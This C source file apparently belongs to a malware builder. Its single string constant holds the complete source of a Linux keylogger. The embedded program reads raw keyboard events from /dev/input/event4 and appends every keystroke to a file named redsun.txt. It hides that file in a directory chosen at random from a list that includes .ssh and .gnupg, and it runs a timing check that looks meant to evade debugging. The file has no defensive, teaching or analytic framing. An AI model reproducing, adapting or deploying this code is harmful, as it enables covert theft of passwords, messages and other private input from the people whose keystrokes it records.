static const char* KeyLog_code = "\
#include <stdbool.h>\n\
#include <string.h>\n\
#include <stdlib.h>\n\
#include <linux/input.h>\n\
#include <fcntl.h>\n\
#include <unistd.h>\n\
#include <stdio.h>\n\
#include <time.h>\n\
\
FILE* log_file;\n\
\
static bool loop = false;\n\
clock_t init_timer;\n\
\
int file_events;\n\
\
float calc;\n\
float *calc_ptr = &calc;\n\
\
char USER_PATH;\n\
char *ptr_USER_PATH = &USER_PATH;\n\
\
char file_path;\n\
char *ptr_file_path = &file_path;\n\
\
char* PATHS[] = { \".local/share/man/\",\n\
                  \".config/\",\n\
                  \".local/share/nano/\",\n\
                  \".local/share/Trash/info/\",\n\
                  \".local/lib/\",\n\
                  \".gnupg/\",\n\
                  \".dbus/\",\n\
                  \".fonts/\",\n\
                  \".ssh/\",\n\
                  \".local/\"};\n\
\
\
static void GET_USER_PATH(void);\n\
static void QUIT(void);\n\
static char* CHECK(void);\n\
static char* CHOSE_PATH(void);\n\
static void LOG_IT(char*);\n\
\
\
\
static void GET_USER_PATH(void) {\n\
  ptr_USER_PATH = calloc( (sizeof(\"/home//\") + sizeof(getenv(\"USER\"))), sizeof(char));\n\
  strcat(ptr_USER_PATH, \"/home/\");\n\
  strcat(ptr_USER_PATH, getenv(\"USER\"));\n\
  strcat(ptr_USER_PATH, \"/\");\n\
  return;\n\
}\n\
\
\
\
int main(void) {\n\
  atexit(QUIT);\n\
  clock_t end_timer = clock();\n\
  float seconds = (float)(end_timer - init_timer) / CLOCKS_PER_SEC;\n\
  if (seconds >= 0.004500) {\n\
    QUIT();\n\
  }\n\
\
  GET_USER_PATH();\n\
\
  chdir(ptr_USER_PATH);\n\
\
  char* path;\n\
  path = CHECK();\n\
\
  if ( path != NULL) {\n\
    LOG_IT(path);\n\
  }\n\
  else {\n\
    path = CHOSE_PATH();\n\
    LOG_IT(path);\n\
  }\n\
\
  return 0;\n\
}\n\
\
\
\
static void QUIT(void) {\n\
  loop = false;\n\
  free(ptr_file_path);\n\
  free(ptr_USER_PATH);\n\
  exit(0);\n\
}\n\
\
\
\
char log_path;\n\
char *ptr_log_path;\n\
static char* CHECK(void) {\n\
\
  for (int num = 0; num < (sizeof(PATHS) / sizeof(PATHS[0])); num++) {\n\
\
      ptr_log_path = calloc( (strlen(ptr_USER_PATH) + strlen(PATHS[num]) + strlen(\"redsun.txt\")) , sizeof(char));\n\
      strcat(ptr_log_path, ptr_USER_PATH);\n\
      strcat(ptr_log_path, PATHS[num]);\n\
      strcat(ptr_log_path, \"redsun.txt\");\n\
\
\
      if ((access(ptr_log_path, F_OK)) != -1) {\n\
        return PATHS[num];\n\
        break;\n\
      }\n\
      else {\n\
        continue;\n\
      }\n\
   };\n\
   return NULL;\n\
}\n\
\
\
\
char chosen_path[200];\n\
static char* CHOSE_PATH(void) {\n\
\
  time_t time_value;\n\
  srand((unsigned) time(&time_value));\n\
  int number = (rand() % (8 + 1));\n\
\
  strcat(chosen_path, PATHS[number]);\n\
\
  return chosen_path;\n\
}\n\
\
\
\
static void LOG_IT(char* PATH) {\n\
\
  ptr_file_path = calloc( (strlen(\"redsun.txt\") + strlen(PATH)), sizeof(char));\n\
  strcat(ptr_file_path, \"./\");\n\
  strcat(ptr_file_path, PATH);\n\
  strcat(ptr_file_path, \"redsun.txt\");\n\
\
\
  struct input_event event;\n\
  file_events = open(\"/dev/input/event4\", O_RDONLY);\n\
\
\
  loop = true;\n\
  while (loop == true) {\n\
\
    read(file_events, &event, sizeof(event));\n\
    if ((event.type == EV_KEY) && (event.value == 0)) {\n\
\
        log_file = fopen(ptr_file_path, \"a\");\n\
\
        fflush(log_file);\n\
        switch (event.code) {\n\
          case 30:fprintf(log_file, \"a\"); break;\n\
          case 48:fprintf(log_file, \"b\"); break;\n\
          case 46:fprintf(log_file, \"c\"); break;\n\
          case 32:fprintf(log_file, \"d\"); break;\n\
          case 18:fprintf(log_file, \"e\"); break;\n\
          case 33:fprintf(log_file, \"f\"); break;\n\
          case 34:fprintf(log_file, \"g\"); break;\n\
          case 35:fprintf(log_file, \"h\"); break;\n\
          case 23:fprintf(log_file, \"i\"); break;\n\
          case 36:fprintf(log_file, \"j\"); break;\n\
          case 37:fprintf(log_file, \"k\"); break;\n\
          case 38:fprintf(log_file, \"l\"); break;\n\
          case 50:fprintf(log_file, \"m\"); break;\n\
          case 49:fprintf(log_file, \"n\"); break;\n\
          case 24:fprintf(log_file, \"o\"); break;\n\
          case 25:fprintf(log_file, \"p\"); break;\n\
          case 16:fprintf(log_file, \"q\"); break;\n\
          case 19:fprintf(log_file, \"r\"); break;\n\
          case 31:fprintf(log_file, \"s\"); break;\n\
          case 20:fprintf(log_file, \"t\"); break;\n\
          case 22:fprintf(log_file, \"u\"); break;\n\
          case 47:fprintf(log_file, \"v\"); break;\n\
          case 17:fprintf(log_file, \"w\"); break;\n\
          case 45:fprintf(log_file, \"x\"); break;\n\
          case 21:fprintf(log_file, \"y\"); break;\n\
          case 44:fprintf(log_file, \"z\"); break;\n\
          case 39:fprintf(log_file, \"ç\"); break;\n\
          case 40:fprintf(log_file, \"~^\"); break;\n\
          case 13:fprintf(log_file, \"=\"); break;\n\
          case 14:fprintf(log_file, \"\\n[$BACKSPACE]\\n\"); break;\n\
          case 15:fprintf(log_file, \"\\n[$TAB]\\n\"); break;\n\
          case 27:fprintf(log_file, \"[{\"); break;\n\
          case 43:fprintf(log_file, \"]}\"); break;\n\
          case 53:fprintf(log_file, \";:\"); break;\n\
          case 41:fprintf(log_file, \"'\"); break;\n\
          case 26:fprintf(log_file, \"´`\"); break;\n\
          case 28:fprintf(log_file, \" [ENTER]\\n\"); break;\n\
          case 51:fprintf(log_file, \",<\"); break;\n\
          case 52:fprintf(log_file, \".>\"); break;\n\
          case 89:fprintf(log_file, \"/?\"); break;\n\
          case 86:fprintf(log_file, \"|\"); break;\n\
          case 57:fprintf(log_file, \" \"); break;\n\
          case 111:fprintf(log_file, \"\\n[$DELETE]\"); break;\n\
          case 42:fprintf(log_file, \"\\n[$LSHIFT]\\n\"); break;\n\
          case 54:fprintf(log_file, \"\\n[$RSHIFT]\\n\"); break;\n\
          case 12:fprintf(log_file, \"-_\"); break;\n\
          case 58:fprintf(log_file, \"\\n[$CAPSLOCK]\\n\"); break;\n\
          case 11:fprintf(log_file, \"0\"); break;\n\
          case 2:fprintf(log_file, \"1\"); break;\n\
          case 3:fprintf(log_file, \"2\"); break;\n\
          case 4:fprintf(log_file, \"3\"); break;\n\
          case 5:fprintf(log_file, \"4\"); break;\n\
          case 6:fprintf(log_file, \"5\"); break;\n\
          case 7:fprintf(log_file, \"6\"); break;\n\
          case 8:fprintf(log_file, \"7\"); break;\n\
          case 9:fprintf(log_file, \"8\"); break;\n\
          case 10:fprintf(log_file, \"9\"); break;\n\
          default:fprintf(log_file, \"_\"); break;\n\
        }\n\
    }\n\
    else {\n\
      continue;\n\
    }\n\
\
    fclose(log_file);\n\
  };\n\
\
  close(file_events);\n\
  return;\n\
}";
